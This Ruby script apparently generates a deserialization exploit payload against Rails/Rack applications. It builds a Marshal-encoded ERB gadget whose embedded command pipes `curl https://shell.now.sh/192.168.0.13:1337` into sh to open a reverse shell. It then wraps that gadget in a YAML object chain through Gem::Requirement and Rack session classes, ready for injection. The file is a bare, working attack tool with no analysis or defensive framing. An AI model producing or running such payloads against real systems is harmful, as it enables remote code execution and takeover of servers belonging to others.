require 'yaml'
require 'base64'
require 'erb'

class ActiveSupport
  class Deprecation
    def initialize()
      @silenced = true
    end
    class DeprecatedInstanceVariableProxy
      def initialize(instance, method)
        @instance = instance
        @method = method
        @deprecator = ActiveSupport::Deprecation.new
      end
    end
  end
end

code = <<-EOS
`curl https://shell.now.sh/192.168.0.13:1337 | sh`
EOS

erb = ERB.allocate
erb.instance_variable_set :@src, code
erb.instance_variable_set :@lineno, 1337

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result

payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")

payload = <<-PAYLOAD
---%0a
!ruby/object:Gem::Requirement%0a
requirements:%0a
  !ruby/object:Rack::Session::Abstract::SessionHash%0a
    req: !ruby/object:Rack::Request%0a
      env:%0a
        "rack.session": !ruby/object:Rack::Session::Abstract::SessionHash%0a
          id: 'hi from espr'%0a
        HTTP_COOKIE: "a=#{payload}"%0a
    store: !ruby/object:Rack::Session::Cookie%0a
      coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}%0a
      key: a%0a
      secrets: []%0a
    exists: true%0a
    loaded: false%0a
PAYLOAD

puts payload

